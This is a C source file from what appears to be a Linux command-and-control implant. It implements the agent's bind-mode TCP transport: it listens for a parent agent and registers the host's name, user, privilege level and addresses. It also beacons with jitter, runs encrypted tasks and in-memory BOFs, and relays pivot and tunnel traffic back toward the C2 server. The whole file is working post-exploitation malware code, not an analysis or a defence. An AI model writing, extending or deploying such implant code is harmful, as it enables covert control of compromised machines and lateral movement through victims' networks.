/* nax_linux/src/Transport/tcp_bind.c
 * Bind-mode TCP transport for the Linux NAX agent (pivot / child-side).
 */

#include "nax_linux.h"
#include "opsec.h"
#include <pthread.h>
#include "sysinfo.h"
#include "commands.h"

#include "nax_bof_sdk.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <poll.h>

int nax_encrypt(const uint8_t *, const uint8_t *, uint32_t, uint8_t *, uint32_t *);
int nax_decrypt(const uint8_t *, const uint8_t *, uint32_t, uint8_t *, uint32_t *);
int nax_frame_encode(uint8_t, const uint8_t *, uint32_t, uint8_t *, uint32_t *);
int nax_frame_decode(const uint8_t *, uint32_t, uint8_t *, uint8_t **, uint32_t *);
int nax_build_reg_body(const char *, uint32_t, const char *, uint32_t,
                       uint8_t, uint32_t, uint32_t, uint32_t,
                       const char *, uint32_t, const char *, uint32_t,
                       const char *, uint32_t, uint8_t,
                       uint32_t, uint32_t, uint16_t,
                       uint32_t, uint32_t, uint32_t,
                       const char *, uint32_t,
                       uint8_t *, uint32_t *);
int nax_build_heartbeat(uint8_t *, uint32_t *);
int nax_build_result(uint32_t, uint8_t, const uint8_t *, uint32_t,
                     uint8_t *, uint32_t *);
int nax_decode_task(const uint8_t *, uint32_t, NaxTask *);
void nax_gather_sysinfo(NaxSysInfo *info);
uint8_t nax_dispatch(NaxAgent *, NaxTask *, uint8_t **, uint32_t *);
const char *nax_read_lenstr(const uint8_t *, uint32_t, uint32_t *, uint32_t *);

static void sleep_ms(uint32_t ms) {
    struct timespec ts = { ms / 1000, (long)(ms % 1000) * 1000000L };
    nanosleep(&ts, NULL);
}

static uint32_t effective_sleep_ms(NaxAgent *a) {
    if (!a->cfg.sleep_ms)    return 0;
    if (!a->cfg.jitter_pct)  return a->cfg.sleep_ms;
    uint32_t jit = (uint32_t)(((uint64_t)a->cfg.sleep_ms * a->cfg.jitter_pct) / 100);
    uint32_t off = jit ? (uint32_t)(random() % jit) : 0;
    return (random() & 1) ? a->cfg.sleep_ms + off
           : (a->cfg.sleep_ms > off ? a->cfg.sleep_ms - off : 0);
}

static void gen_session_id(char *out) {
    /* Stable ID from hostname + MAC — survives restarts */
    uint8_t raw[8] = {0};
    char hostname[64] = {0};
    gethostname(hostname, sizeof(hostname) - 1);
    size_t hlen = strlen(hostname);
    for (size_t i = 0; i < hlen && i < 8; i++) raw[i] ^= (uint8_t)hostname[i];
    {
        struct ifreq ifr; struct ifconf ifc; char buf[1024];
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock >= 0) {
            ifc.ifc_len = sizeof(buf); ifc.ifc_buf = buf;
            if (ioctl(sock, SIOCGIFCONF, &ifc) == 0) {
                struct ifreq *it = ifc.ifc_req;
                struct ifreq *end = it + (ifc.ifc_len / sizeof(*it));
                for (; it != end; ++it) {
                    strncpy(ifr.ifr_name, it->ifr_name, IFNAMSIZ-1);
                    if (ioctl(sock, SIOCGIFFLAGS, &ifr) != 0) continue;
                    if (ifr.ifr_flags & IFF_LOOPBACK) continue;
                    if (!(ifr.ifr_flags & IFF_UP)) continue;
                    if (ioctl(sock, SIOCGIFHWADDR, &ifr) != 0) continue;
                    uint8_t *mac = (uint8_t *)ifr.ifr_hwaddr.sa_data;
                    for (int i = 0; i < 6; i++) raw[i] ^= mac[i];
                    break;
                }
            }
            close(sock);
        }
    }
    int all_zero = 1;
    for (int i = 0; i < 8; i++) if (raw[i]) { all_zero = 0; break; }
    if (all_zero) {
        int fd = open("/dev/urandom", O_RDONLY);
        if (fd >= 0) { read(fd, raw, 8); close(fd); }
    }
    /* Mix in PID so each process execution gets a unique session ID */
    raw[4] ^= (uint8_t)(getpid() & 0xFF);
    raw[5] ^= (uint8_t)((getpid() >> 8) & 0xFF);

    /* Mix in bind port + mode flag so bind agents on the same host as a
     * connect-out agent always get a different session ID. */
#ifdef NAX_TCP_MODE_BIND
    raw[6] ^= (uint8_t)(NAX_BIND_PORT & 0xFF);
    raw[7] ^= (uint8_t)((NAX_BIND_PORT >> 8) & 0xFF) ^ 0xB1; /* 0xB1 = bind marker */
#endif
    static const char hex[] = "0123456789abcdef";
    for (int i = 0; i < 8; i++) {
        out[i*2]   = hex[(raw[i]>>4)&0xF];
        out[i*2+1] = hex[raw[i]&0xF];
    }
    out[16] = '\0';
}

static int tcp_recv_exact(int sock, uint8_t *buf, uint32_t len) {
    uint32_t got = 0;
    while (got < len) {
        ssize_t r = recv(sock, buf+got, len-got, 0);
        if (r <= 0) { if (r<0&&(errno==EINTR||errno==EAGAIN)) continue; return -1; }
        got += (uint32_t)r;
    }
    return 0;
}

static int tcp_send_exact(int sock, const uint8_t *buf, uint32_t len) {
    uint32_t sent = 0;
    while (sent < len) {
        ssize_t r = send(sock, buf+sent, len-sent, MSG_NOSIGNAL);
        if (r <= 0) { if (r<0&&(errno==EINTR||errno==EAGAIN)) continue; return -1; }
        sent += (uint32_t)r;
    }
    return 0;
}

static int lp_recv(int sock, uint8_t **out, uint32_t *out_len) {
    uint8_t hdr[4];
    if (tcp_recv_exact(sock, hdr, 4) < 0) return -1;
    uint32_t len = (uint32_t)hdr[0] | ((uint32_t)hdr[1]<<8) |
                   ((uint32_t)hdr[2]<<16) | ((uint32_t)hdr[3]<<24);
    if (!len || len > NAX_IO_CAP) return -1;
    *out = malloc(len);
    if (!*out) return -1;
    if (tcp_recv_exact(sock, *out, len) < 0) { free(*out); *out=NULL; return -1; }
    *out_len = len;
    return 0;
}

static int lp_send(int sock, const uint8_t *data, uint32_t len) {
    uint8_t hdr[4] = { len&0xFF, (len>>8)&0xFF, (len>>16)&0xFF, (len>>24)&0xFF };
    if (tcp_send_exact(sock, hdr, 4) < 0) return -1;
    return tcp_send_exact(sock, data, len);
}

static int send_encrypted(NaxAgent *a, int sock, uint8_t *frame, uint32_t frame_len) {
    uint32_t enc_cap = frame_len + NAX_AES_IV + NAX_AES_BLOCK;
    uint8_t *enc = malloc(enc_cap);
    if (!enc) return -1;
    uint32_t enc_len = enc_cap;
    int rc = nax_encrypt(a->cfg.aes_key, frame, frame_len, enc, &enc_len);
    if (rc == 0) rc = lp_send(sock, enc, enc_len);
    free(enc);
    return rc;
}

static int do_register(NaxAgent *a, int sock) {
    NaxSysInfo info;
    nax_gather_sysinfo(&info);

    uint8_t  reg_body[4096];
    uint32_t reg_body_len = sizeof(reg_body);
    if (nax_build_reg_body(
            info.hostname, strlen(info.hostname),
            info.username, strlen(info.username),
            NAX_ARCH_CURRENT,
            info.pid, a->cfg.sleep_ms, info.tid,
            info.ip,       strlen(info.ip),
            info.domain,   strlen(info.domain),
            info.procname, strlen(info.procname),
            info.elevated,
            info.os_major, info.os_minor, info.os_build,
            info.ppid, 0, 0,
            info.imgpath, strlen(info.imgpath),
            reg_body, &reg_body_len) < 0) return -1;

    uint8_t *frame = malloc(NAX_IO_CAP);
    if (!frame) return -1;
    uint32_t frame_len = NAX_IO_CAP;
    if (nax_frame_encode(NAX_WIRE_REGISTER, reg_body, reg_body_len, frame, &frame_len) < 0)
        { free(frame); return -1; }

    uint32_t enc_cap = frame_len + NAX_AES_IV + NAX_AES_BLOCK;
    uint8_t *enc = malloc(enc_cap);
    if (!enc) { free(frame); return -1; }
    uint32_t enc_len = enc_cap;
    if (nax_encrypt(a->cfg.aes_key, frame, frame_len, enc, &enc_len) < 0)
        { free(frame); free(enc); return -1; }
    free(frame);

    /* Beat layout: [wm(4)][aes_key(16)][sessionId(16)][ciphertext]
     * Including the AES key lets InternalHandler (any parent transport)
     * correctly register the child regardless of the parent's own key. */
    uint32_t beat_len = 4 + 16 + NAX_SID_LEN + enc_len;
    uint8_t *beat = malloc(beat_len);
    if (!beat) { free(enc); return -1; }
    uint32_t wm = a->cfg.wm;
    beat[0]=wm&0xFF; beat[1]=(wm>>8)&0xFF; beat[2]=(wm>>16)&0xFF; beat[3]=(wm>>24)&0xFF;
    memcpy(beat+4, a->cfg.aes_key, 16);
    memcpy(beat+4+16, a->session_id, NAX_SID_LEN);
    memcpy(beat+4+16+NAX_SID_LEN, enc, enc_len);
    free(enc);

    int rc = lp_send(sock, beat, beat_len);
    free(beat);
    return rc;
}

/* Forward declaration for tunnel.c */
extern void nax_process_tunnels(NaxAgent *a);
extern uint32_t nax_process_tunnels_ex(NaxAgent *a, uint8_t *out, uint32_t out_cap);

/* Global C2 parent socket for tunnel results in bind mode.
 * Protected by g_sock_mutex so reader threads can write safely. */
static int             g_tunnel_sock  = -1;
static pthread_mutex_t g_sock_mutex   = PTHREAD_MUTEX_INITIALIZER;

/* Public wrapper used by tunnel.c — send STATUS_TUNNEL frame in bind mode */


static int do_heartbeat(NaxAgent *a, int sock) {
    uint8_t  frame[NAX_FRAME_HDR + 64];
    uint32_t frame_len = sizeof(frame);
    if (nax_build_heartbeat(frame, &frame_len) < 0) return -1;
    return send_encrypted(a, sock, frame, frame_len);
}

/* ===== process_pivots_bind =============================================
 * Read pending data from child pivot sockets and relay to the parent.
 * Mirror of process_pivots() in tcp.c but sends to parent sock instead
 * of C2. The parent will forward the data up the chain to the C2.
 * ==================================================================== */
static void process_pivots_bind(NaxAgent *a, int parent_sock)
{
    NaxPivot **pp = &a->pivot_head;
    while (*pp) {
        NaxPivot *p = *pp;
        int broken  = 0;

        struct pollfd pfd = { .fd = p->sock, .events = POLLIN };
        while (1) {
            int pr = poll(&pfd, 1, 0);
            if (pr <= 0) break;
            if (!(pfd.revents & POLLIN)) break;

            uint8_t lenbuf[4];
            ssize_t got = 0;
            while (got < 4) {
                ssize_t r = recv(p->sock, lenbuf + got, 4 - got, 0);
                if (r <= 0) { broken = 1; break; }
                got += r;
            }
            if (broken) break;

            uint32_t msg_len = (uint32_t)lenbuf[0] | ((uint32_t)lenbuf[1]<<8) |
                               ((uint32_t)lenbuf[2]<<16) | ((uint32_t)lenbuf[3]<<24);
            if (msg_len == 0 || msg_len > 4 * 1024 * 1024) { broken = 1; break; }

            uint8_t *msg = malloc(msg_len);
            if (!msg) { broken = 1; break; }
            got = 0;
            while ((uint32_t)got < msg_len) {
                ssize_t r = recv(p->sock, msg + got, msg_len - (uint32_t)got, 0);
                if (r <= 0) { free(msg); broken = 1; break; }
                got += r;
            }
            if (broken) break;

            /* Pack as PIV_TYPE_DATA and send to parent */
            uint32_t rd_len = 1 + 4 + 4 + msg_len;
            uint8_t *rd = malloc(rd_len);
            if (rd) {
                rd[0] = NAX_PIV_TYPE_DATA;
                rd[1] = (uint8_t)(p->pivot_id);       rd[2] = (uint8_t)(p->pivot_id>>8);
                rd[3] = (uint8_t)(p->pivot_id>>16);   rd[4] = (uint8_t)(p->pivot_id>>24);
                rd[5] = (uint8_t)(msg_len);            rd[6] = (uint8_t)(msg_len>>8);
                rd[7] = (uint8_t)(msg_len>>16);        rd[8] = (uint8_t)(msg_len>>24);
                memcpy(rd + 9, msg, msg_len);

                /* Build encrypted RESULT frame with task_id=0, status=STATUS_OK */
                uint8_t *res_frame = malloc(NAX_IO_CAP);
                if (res_frame) {
                    uint32_t res_len = NAX_IO_CAP;
                    if (nax_build_result(0, NAX_STATUS_OK, rd, rd_len,
                                        res_frame, &res_len) == 0) {
                        send_encrypted(a, parent_sock, res_frame, res_len);
                    }
                    free(res_frame);
                }
                free(rd);
            }
            free(msg);
        }

        if (broken) {
            /* Child disconnected — send UNLINK notification */
            uint8_t unlink_data[6];
            unlink_data[0] = NAX_PIV_TYPE_UNLINK;
            unlink_data[1] = (uint8_t)(p->pivot_id);    unlink_data[2] = (uint8_t)(p->pivot_id>>8);
            unlink_data[3] = (uint8_t)(p->pivot_id>>16); unlink_data[4] = (uint8_t)(p->pivot_id>>24);
            unlink_data[5] = 2; /* NAX_PIVOT_TYPE_TCP */
            uint8_t *res_frame = malloc(NAX_IO_CAP);
            if (res_frame) {
                uint32_t res_len = NAX_IO_CAP;
                if (nax_build_result(0, NAX_STATUS_OK, unlink_data, sizeof(unlink_data),
                                    res_frame, &res_len) == 0) {
                    send_encrypted(a, parent_sock, res_frame, res_len);
                }
                free(res_frame);
            }
            close(p->sock);
            *pp = p->next;
            free(p);
        } else {
            pp = &p->next;
        }
    }
}

static int handle_parent_data(NaxAgent *a, int sock,
                               uint8_t *raw, uint32_t raw_len) {
    uint8_t *plain = malloc(raw_len + NAX_AES_BLOCK);
    if (!plain) return 0;
    uint32_t plain_len = raw_len + NAX_AES_BLOCK;
    if (nax_decrypt(a->cfg.aes_key, raw, raw_len, plain, &plain_len) < 0)
        { free(plain); return 0; }

    uint8_t *cur = plain;
    uint32_t rem = plain_len;
    int dispatched = 0;
    while (rem >= NAX_FRAME_HDR) {
        uint8_t   ft = 0;
        uint8_t  *fb = NULL;
        uint32_t  fbl = 0;
        if (nax_frame_decode(cur, rem, &ft, &fb, &fbl) < 0) break;
        uint32_t step = NAX_FRAME_HDR + fbl;
        if (step > rem) break;
        cur += step; rem -= step;

        DBG("frame type=0x%02x bodyLen=%u", ft, fbl);
        if (ft == NAX_WIRE_NO_TASKS) { DBG("NO_TASKS frame"); break; }
        if (ft != NAX_WIRE_TASK)     continue;

        NaxTask task;
        if (nax_decode_task(fb, fbl, &task) < 0) continue;

        uint8_t *result     = NULL;
        uint32_t result_len = 0;
        DBG("dispatching cmd_id=0x%02x task_id=%u args_len=%u", task.cmd_id, task.task_id, task.args_len);
        uint8_t  status     = nax_dispatch(a, &task, &result, &result_len);
        DBG("dispatch done: status=0x%02x result_len=%u", status, result_len);

        /* Async BOFs send their result later */
        if (status == NAX_STATUS_ASYNC) {
            if (result) free(result);
            continue;
        }

        /* Pause so the server completes DispatchPostEncode and moves the task
         * into RunningTasks before we send the result. Without this,
         * TsTaskUpdate cannot find the task and silently drops the result. */
        sleep_ms(300);

        uint8_t *res_frame = malloc(NAX_IO_CAP);
        if (res_frame) {
            uint32_t res_len = NAX_IO_CAP;
            if (nax_build_result(task.task_id, status,
                                 result, result_len,
                                 res_frame, &res_len) == 0) {
                DBG("sending RESULT frame");
                send_encrypted(a, sock, res_frame, res_len);
                dispatched++;
            }
            free(res_frame);
        }
        if (result) free(result);
        if (!a->running) { free(plain); return -1; }
    }
    free(plain);

    return 0;
}

/* ===== main bind loop ===== */

typedef struct { NaxAgent *a; int sock; } bind_drain_ctx_t;

static void bind_async_cb(uint32_t task_id, uint8_t status,
                           const char *output, uint32_t output_len,
                           void *user_data) {
    bind_drain_ctx_t *ctx = (bind_drain_ctx_t *)user_data;
    uint8_t *frame = (uint8_t *)malloc(NAX_IO_CAP);
    if (!frame) return;
    uint32_t frame_len = NAX_IO_CAP;
    if (nax_build_result(task_id, status, (const uint8_t *)output, output_len,
                         frame, &frame_len) == 0) {
        send_encrypted(ctx->a, ctx->sock, frame, frame_len);
    }
    free(frame);
}

static void nax_bind_drain_async(NaxAgent *a, int sock) {
    bind_drain_ctx_t ctx = { a, sock };
    nax_async_drain(bind_async_cb, &ctx);
}

void nax_tcp_bind_main(NaxAgent *a) {
    gen_session_id(a->session_id);
    nax_bof_sdk_init();
    a->running = true;
    DBG("bind mode starting: port=%d wm=0x%08x", a->cfg.bind_port, a->cfg.wm);

    int srv = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (srv < 0) return;

    int reuse = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons((uint16_t)a->cfg.bind_port);
#ifdef NAX_BIND_HOST
    if (inet_pton(AF_INET, NAX_BIND_HOST, &addr.sin_addr) <= 0)
        addr.sin_addr.s_addr = INADDR_ANY;
#else
    addr.sin_addr.s_addr = INADDR_ANY;
#endif

    if (bind(srv, (struct sockaddr *)&addr, sizeof(addr)) < 0 ||
        listen(srv, 1) < 0) { close(srv); return; }

    DBG("listening on port %d", a->cfg.bind_port);
    while (a->running) {
        int cli = accept(srv, NULL, NULL);
        if (cli < 0) { if (errno==EINTR) continue; break; }
        DBG("parent connected");

        DBG("sending REGISTER beat");
        if (do_register(a, cli) < 0) { DBG("REGISTER failed"); close(cli); continue; }
        DBG("REGISTER sent OK");

        /* Set global parent socket for tunnel reader threads */
        pthread_mutex_lock(&g_sock_mutex);
        g_tunnel_sock = cli;
        pthread_mutex_unlock(&g_sock_mutex);

        /*
         * Heartbeat/task loop — event-driven with sleep.
         *
         * Protocol:
         *   1. Sleep for effective_sleep_ms (mirrors beacon timing on C2 side)
         *   2. Send HEARTBEAT to parent
         *   3. Wait up to (sleep_ms + 3s) for parent to relay tasks back
         *   4. If tasks arrive, dispatch and send results, then go to 1
         *   5. If timeout (no tasks), go to 1
         *
         * The sleep BEFORE the heartbeat is critical: it gives the C2 time
         * to process the previous result and queue the next task before the
         * child asks again. Without it the child hammers the parent with
         * heartbeats faster than the C2 can respond.
         */
        while (a->running) {
            /* Step 1: Sleep before sending heartbeat */
            uint32_t slp = effective_sleep_ms(a);
            if (slp > 0) sleep_ms(slp);

            /* Tunnel processing handled by reader threads */
            nax_opsec_heartbeat();
            { /* relay tunnels */
                uint8_t *tbuf = (uint8_t *)malloc(4*1024*1024);
                if (tbuf) {
                    uint32_t tl = nax_process_tunnels_ex(a, tbuf, 4*1024*1024);
                    if (tl > 0) {
                        uint8_t *frame = (uint8_t *)malloc(NAX_IO_CAP);
                        if (frame) {
                            uint32_t flen = NAX_IO_CAP;
                            if (nax_build_result(0, NAX_STATUS_TUNNEL, tbuf, tl, frame, &flen) == 0)
                                send_encrypted(a, cli, frame, flen);
                            free(frame);
                        }
                    }
                    free(tbuf);
                }
            }

            /* Drain completed async BOF results */
            nax_bind_drain_async(a, cli);

            /* Relay any pending pivot child data to the parent */
            process_pivots_bind(a, cli);

            /* Step 2: Send heartbeat */
            DBG("sending HEARTBEAT");
            if (do_heartbeat(a, cli) < 0) { DBG("HEARTBEAT send failed"); break; }

            /* Step 3: Wait for parent to relay tasks.
             * When sleep=0 (no delay mode) use 50ms so the agent stays
             * responsive. Otherwise add 3s floor for slower C2 roundtrips. */
            uint32_t poll_ms = (slp == 0) ? 50u : slp + 3000u;
            struct pollfd pfd = { .fd = cli, .events = POLLIN };
            int pr = poll(&pfd, 1, (int)poll_ms);

            if (pr < 0) { DBG("poll error"); break; }

            if (pr == 0) {

                DBG("poll timeout — no tasks from parent");
                continue;
            }

            if (pfd.revents & (POLLHUP | POLLERR)) {
                DBG("parent disconnected (POLLHUP/POLLERR)");
                break;
            }

            if (pfd.revents & POLLIN) {
                uint8_t *raw     = NULL;
                uint32_t raw_len = 0;
                if (lp_recv(cli, &raw, &raw_len) < 0) { DBG("lp_recv failed"); break; }
                DBG("received %u bytes from parent", raw_len);
                int rc = handle_parent_data(a, cli, raw, raw_len);
                free(raw);
                if (rc < 0) break;
            }
        }

        /* Clear global socket so reader threads stop sending */
        pthread_mutex_lock(&g_sock_mutex);
        g_tunnel_sock = -1;
        pthread_mutex_unlock(&g_sock_mutex);
        close(cli);
        gen_session_id(a->session_id);
    }

    close(srv);
}
